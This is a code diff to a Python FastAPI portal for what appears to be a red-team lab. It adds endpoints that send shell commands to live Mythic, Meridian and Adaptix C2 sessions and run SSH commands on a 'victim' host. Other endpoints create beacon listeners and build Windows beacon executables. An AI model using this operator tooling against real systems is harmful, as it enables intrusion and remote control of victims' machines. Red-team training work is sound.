@@ -255,6 +255,35 @@ class RedirectorTestRequest(BaseModel):
     method: str = Field(default="GET", description="HTTP Method")
 
 
+class VictimCommandRequest(BaseModel):
+    command: str = Field(..., description="Command to run on ws01 over SSH")
+    timeout: int = Field(30, description="Seconds before ssh gives up")
+
+
+class AdaptixListenerRequest(BaseModel):
+    name: str = Field("cadre_http", description="Listener instance name")
+    callback_address: str = Field("192.168.77.1:80",
+                                  description="Where the AGENT dials (the redirector)")
+    uri: str = Field("/api/v1/sync", description="Must match ADAPTIX_URI_PREFIX")
+    port: int = Field(80, description="In-container bind port")
+    c2_header: str = Field("X-Request-ID")
+    c2_header_value: str = Field("cadre-c2")
+
+
+class AdaptixAgentRequest(BaseModel):
+    agent: str = Field("beacon")
+    listener: str = Field("cadre_http", description="Listener INSTANCE name")
+    arch: str = Field("x64")
+    format: str = Field("Exe")
+    sleep: str = Field("30s")
+    jitter: int = Field(0, description="Must be 0 on this snapshot (PR #379 bug)")
+
+
+class AdaptixTaskRequest(BaseModel):
+    agent_id: str = Field(..., description="a_id from /api/ops/adaptix/agents")
+    cmdline: str = Field(..., description="Raw Adaptix command, e.g. 'whoami'")
+
+
 class DnsDissectRequest(BaseModel):
     payload_text: str = Field(default="whoami /all", description="Command or message to transmit over DNS TXT")
     domain_suffix: str = Field(default="c2.cadre.local", description="DNS C2 zone suffix")
@@ -635,49 +664,250 @@ def get_payload_studio() -> dict[str, Any]:
     }
 
 
+# ============================================================================
+# Real backend operations (tasking, payloads, victim) - see c2backends.py
+# ============================================================================
+import c2backends as cb  # noqa: E402
+
+
+class TaskRequest(BaseModel):
+    session_id: str = Field(..., description="Session/callback id")
+    backend: str = Field(..., description="meridian | mythic")
+    command: str = Field(..., description="Raw command line (alias commands take "
+                                           "a plain string, not JSON)")
+    callback_id: int | None = Field(None, description="Mythic callback id")
+
+
+@app.get("/api/ops/summary")
+def ops_summary() -> dict[str, Any]:
+    """What the portal can actually DO right now, probed live."""
+    out: dict[str, Any] = {}
+    try:
+        rows = cb.mythic_psql(
+            "SELECT id, name, container_running FROM payloadtype;",
+            ["id", "name", "container_running"])
+        out["mythic"] = {
+            "ok": True,
+            "payload_types": [{"id": r.get("id"), "name": r.get("name"),
+                               "running": r.get("container_running") == "t"}
+                              for r in rows],
+        }
+    except Exception as exc:  # noqa: BLE001
+        out["mythic"] = {"ok": False, "error": str(exc)[:200]}
+    try:
+        cbs = cb.mythic_psql("SELECT id, name, container_running FROM c2profile ORDER BY id;",
+                             ["id", "name", "container_running"])
+        out["mythic"]["c2_profiles"] = [
+            {"id": r.get("id"), "name": r.get("name"), "running": r.get("container_running") == "t"}
+            for r in cbs
+        ]
+    except Exception as exc:  # noqa: BLE001
+        out["mythic"]["c2_profiles_error"] = str(exc)[:200]
+    try:
+        out["meridian"] = {"ok": True, "sessions": len(cb.meridian_sessions())}
+    except Exception as exc:  # noqa: BLE001
+        out["meridian"] = {"ok": False, "error": str(exc)[:200]}
+    out["victim_ws01"] = {"reachable": cb.ws01_reachable(), "ssh_target": cb.WS01_SSH}
+
+    # Adaptix: official REST API at /endpoint (login -> listeners/agents).
+    try:
+        import adaptix_client as ax
+        ac = ax.AdaptixClient()
+        ac.login()
+        out["adaptix"] = {
+            "ok": True,
+            "auth": "rest /endpoint/login",
+            "listeners": ac.list_listeners(),
+        }
+    except Exception as exc:  # noqa: BLE001
+        out["adaptix"] = {"ok": False, "error": str(exc)[:300]}
+
+    # Havoc: teamserver state is visible in its logs; no REST API exists in 0.7.
+    out["havoc"] = {
+        "ok": True,
+        "note": ("Havoc 0.7 exposes NO REST/gRPC API - the operator protocol is "
+                 "WebSocket+TLS on 40056. The portal drives it via a raw "
+                 "WebSocket client (see /api/ops/havoc/*)."),
+        "teamserver": "192.168.77.1:40056",
+        "user": "5pider",
+    }
+    out["redirector"] = {
+        "decoy": cb.probe_redirector("/", timeout=5.0),
+        "meridian": cb.probe_redirector("/gateway/v1/telemetry/",
+                                        {"X-Request-ID": os.environ.get(
+                                            "C2_HEADER_VALUE", "cadre-c2")}, timeout=5.0),
+    }
+    return out
+
+
+@app.post("/api/ops/task")
+def ops_task(req: TaskRequest) -> dict[str, Any]:
+    """Queue a real command against a live session."""
+    try:
+        if req.backend == "meridian":
+            return {"ok": True, "backend": "meridian",
+                    "result": cb.meridian_exec(req.session_id, req.command)}
+        if req.backend == "mythic":
+            client = cb.MythicClient()
+            cid = req.callback_id if req.callback_id is not None else int(req.session_id)
+            # `shell` is an ALIAS command: params is the RAW command line, not JSON.
+            out = client.post("/api/v1.4/create_task_webhook",
+                              {"input": {"command": "shell", "params": req.command,
+                                         "callback_id": cid}})
+            return {"ok": True, "backend": "mythic", "result": out}
+        raise HTTPException(status_code=400,
+                            detail=f"unsupported backend '{req.backend}'")
+    except cb.BackendError as exc:
+        raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+
+@app.get("/api/ops/results")
+def ops_results(backend: str, session_id: str | None = None) -> dict[str, Any]:
+    """Read real task results."""
+    try:
+        if backend == "meridian":
+            return {"ok": True, "results": cb.meridian_results(session_id)}
+        if backend == "mythic":
+            client = cb.MythicClient()
+            raw = client.get("/api/v1.4/oplog_webhook?limit=50").decode("utf-8", "replace")
+            return {"ok": True, "raw": raw[:4000]}
+        raise HTTPException(status_code=400, detail=f"unsupported backend '{backend}'")
+    except cb.BackendError as exc:
+        raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+
+@app.post("/api/ops/probe")
+def ops_probe(req: RedirectorTestRequest) -> dict[str, Any]:
+    """Actually probe the redirector. Reports the REAL status, byte length and
+    whether the decoy was returned."""
+    return cb.probe_redirector(req.url_path, req.headers, req.method)
+
+
+@app.post("/api/ops/victim")
+def ops_victim(req: VictimCommandRequest) -> dict[str, Any]:
+    """Run a command on ws01 over SSH."""
+    result = cb.ws01_exec(req.command, timeout=req.timeout)
+    if not result.get("ok") and result.get("returncode") not in (0, None):
+        raise HTTPException(status_code=502, detail=result.get("stderr", "ssh failed"))
+    return result
+
+
+@app.post("/api/ops/adaptix/listener")
+def ops_adaptix_listener(req: AdaptixListenerRequest) -> dict[str, Any]:
+    """Create/ensure the Adaptix HTTP Beacon listener via the REST API."""
+    import adaptix_client as ax
+    try:
+        ac = ax.AdaptixClient()
+        ac.login()
+        cfg = ax.http_listener_config(req.callback_address, req.uri,
+                                      req.c2_header, req.c2_header_value, req.port)
+        out = ac.create_listener(req.name, cfg)
+        return {"ok": True, "listener": req.name, "response": out,
+                "listeners": ac.list_listeners()}
+    except cb.BackendError as exc:
+        raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+
+@app.post("/api/ops/adaptix/agent")
+def ops_adaptix_agent(req: AdaptixAgentRequest) -> dict[str, Any]:
+    """Build a Windows beacon server-side and return base64 for download."""
+    import adaptix_client as ax
+    try:
+        ac = ax.AdaptixClient()
+        ac.login()
+        cfg = ax.beacon_config(req.sleep, req.jitter, req.arch, req.format)
+        data = ac.generate_agent(req.agent, req.listener, cfg, timeout=300)
+        return {"ok": True, "agent": req.agent, "listener": req.listener,
+                "filename": getattr(ac, "last_filename", "agent.bin"),
+                "size": len(data),
+                "base64": base64.b64encode(data).decode("ascii")}
+    except cb.BackendError as exc:
+        raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+
+@app.get("/api/ops/adaptix/agents")
+def ops_adaptix_agents() -> dict[str, Any]:
+    import adaptix_client as ax
+    try:
+        ac = ax.AdaptixClient()
+        ac.login()
+        return {"ok": True, "agents": ac.list_agents()}
+    except cb.BackendError as exc:
+        raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+
+@app.post("/api/ops/adaptix/task")
+def ops_adaptix_task(req: AdaptixTaskRequest) -> dict[str, Any]:
+    """Task an Adaptix agent. Runs server-side via the AxScript engine."""
+    import adaptix_client as ax
+    try:
+        ac = ax.AdaptixClient()
+        ac.login()
+        return {"ok": True, "result": ac.agent_command_raw(req.agent_id, req.cmdline)}
+    except cb.BackendError as exc:
+        raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+
+@app.get("/api/ops/adaptix/results")
+def ops_adaptix_results(agent_id: str, limit: int = 50) -> dict[str, Any]:
+    """Completed Adaptix tasks WITH output (synchronous, no WebSocket needed)."""
+    import adaptix_client as ax
+    try:
+        ac = ax.AdaptixClient()
+        ac.login()
+        return {"ok": True, "tasks": ac.completed_tasks(agent_id, limit=limit)}
+    except cb.BackendError as exc:
+        raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+
 @app.get("/api/sessions")
 def get_fleet_sessions() -> dict[str, Any]:
-    """Query active C2 sessions across Meridian, Sliver, and Havoc."""
-    # Probe Meridian local endpoint if available
-    sessions = []
-    try:
-        req = urllib.request.Request("http://meridian:8080/api/sessions")
-        with urllib.request.urlopen(req, timeout=1.0) as resp:
-            data = json.loads(resp.read().decode("utf-8"))
-            for item in data if isinstance(data, list) else data.get("sessions", []):
-                sessions.append({
-                    "id": item.get("id"),
-                    "backend": "meridian",
-                    "hostname": item.get("hostname", "unknown"),
-                    "username": item.get("user") or item.get("username", "unknown"),
-                    "os": item.get("os", "windows"),
-                    "transport": "HTTP" if item.get("listener") == "http" else "DNS TXT",
-                    "last_seen": item.get("last_seen") or "Just now",
-                    "is_alive": True,
-                })
-    except Exception:
-        # Fallback simulator for learning UI display
-        sessions = [
-            {
-                "id": "c2-meridian-91a",
-                "backend": "meridian",
-                "hostname": "WS01",
-                "username": "CHILD\\analyst_t1",
-                "os": "Windows 11 Enterprise",
-                "transport": "DNS TXT (:15353)",
-                "last_seen": "12s ago",
-                "is_alive": True,
-            },
-            {
-                "id": "c2-sliver-74b",
-                "backend": "sliver",
-                "hostname": "MBR01",
-                "username": "NT AUTHORITY\\SYSTEM",
-                "os": "Windows Server 2022",
-                "transport": "HTTP (:80 via Redirector)",
-                "last_seen": "3s ago",
-                "is_alive": True,
-            },
-        ]
+    """REAL C2 sessions across the frameworks we can query headlessly.
 
-    return {"count": len(sessions), "sessions": sessions}
+    Backends are queried independently and each reports its own error. A backend
+    that is down produces an `error` entry - never invented sessions. (The
+    previous version returned fabricated hosts whenever the backend was
+    unreachable, which made the dashboard lie about the lab's state.)
+    """
+    import c2backends as cb
+
+    sessions: list[dict[str, Any]] = []
+    backends: dict[str, Any] = {}
+
+    # --- Mythic (real DB) ---
+    try:
+        rows = cb.mythic_psql(
+            "SELECT id, host, user, pid, os, architecture, active, dead "
+            "FROM callback ORDER BY id DESC LIMIT 50;"
+        )
+        for r in rows:
+            sessions.append({
+                "id": str(r.get("id")),
+                "backend": "mythic",
+                "hostname": r.get("host") or "?",
+                "username": r.get("user") or "?",
+                "os": f"{r.get('os','?')} {r.get('architecture','')}".strip(),
+                "transport": "http profile",
+                "pid": r.get("pid"),
+                "is_alive": (r.get("active") == "t" and r.get("dead") == "f"),
+            })
+        backends["mythic"] = {"ok": True, "count": len(rows)}
+    except Exception as exc:  # noqa: BLE001
+        backends["mythic"] = {"ok": False, "error": str(exc)[:200]}
+
+    # --- Meridian (real CLI) ---
+    try:
+        m = cb.meridian_sessions()
+        sessions.extend(m)
+        backends["meridian"] = {"ok": True, "count": len(m)}
+    except Exception as exc:  # noqa: BLE001
+        backends["meridian"] = {"ok": False, "error": str(exc)[:200]}
+
+    return {
+        "count": len(sessions),
+        "sessions": sessions,
+        "backends": backends,
+        "note": "Live data from Mythic postgres and the Meridian CLI. "
+                "Sliver/Havoc/Adaptix sessions are not listed because those "
+                "frameworks expose no headless session query.",
+    }
